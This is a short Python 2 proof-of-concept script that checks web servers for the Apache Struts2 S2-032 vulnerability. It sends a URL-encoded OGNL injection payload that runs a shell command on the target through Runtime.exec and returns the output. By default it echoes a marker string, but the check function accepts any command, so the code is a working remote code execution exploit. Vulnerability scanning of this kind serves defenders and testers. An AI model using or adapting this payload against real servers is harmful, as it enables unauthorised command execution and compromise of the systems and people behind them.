#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber

import sys
import requests

def check(url, command):
    url = url.rstrip('/')
    data = '''/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=command&pp=%5C%5CA&ppp=%20&encoding=UTF-8'''

    target = url+data.replace('command',command)
    html = requests.get(url=target).content
    
    if 'dd996b71024fa97cd015f06a7f24ed30' in html:
        print "%s has st2-032 vulnerable." % url
    else:
        print 'not has st2-032'

def run(url):
    command = 'echo dd996b71024fa97cd015f06a7f24ed30'
    check(url, command)

if __name__ == '__main__':
    if len(sys.argv) == 2:
        url = sys.argv[1]
        run(url)
    else:
        print "usage: python {} http://www.test.com".format(sys.argv[0])
        sys.exit(-1)
